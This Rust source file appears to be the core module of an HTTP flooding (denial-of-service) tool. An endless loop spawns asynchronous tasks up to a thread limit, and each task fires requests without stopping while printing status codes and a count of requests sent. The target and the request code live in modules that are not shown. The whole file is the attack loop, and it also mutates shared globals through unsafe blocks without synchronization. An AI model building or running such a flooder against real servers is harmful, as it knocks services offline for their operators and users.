use tokio::time::Instant;

use crate::extra_fn::{add_start, request, time_function};
use crate::ram_manger::{SAFE_PUB_VAR, UNSAFE_PUB_VAR};

pub async fn start() {
    loop {
        core_attack().await;
    }
}

async fn core_attack() {
    if let Ok(threads) = SAFE_PUB_VAR.lock() {
        if threads.thread_on + 1.0 < threads.threads_allowed {
            add_start(threads);
            tokio::spawn(async {
                loop {
                    let (now, error_data) = (Instant::now(), request());
                    match error_data.await {
                        Ok(status_code) => unsafe {
                            UNSAFE_PUB_VAR.amount_sent += 1.0;
                            println!(
                                "Threads on {},\n Status code {},\n Time Passed for request {} sec,\n Request per 10 Millisecond {}",
                                UNSAFE_PUB_VAR.threads_on,
                                status_code.status(),
                                now.elapsed().as_secs(),
                                UNSAFE_PUB_VAR.amount_sent,
                            );
                        }
                        Err(data) => unsafe {
                            println!(
                                "Threads on {}, Status ERROR {}\n Time: {}\n Request per 10 Millisecond {}",
                                UNSAFE_PUB_VAR.threads_on,
                                data,
                                now.elapsed().as_secs(),
                                UNSAFE_PUB_VAR.amount_sent
                            );
                        }
                    }
                }
            });
        } else {
            time_function();
        }
    }
}

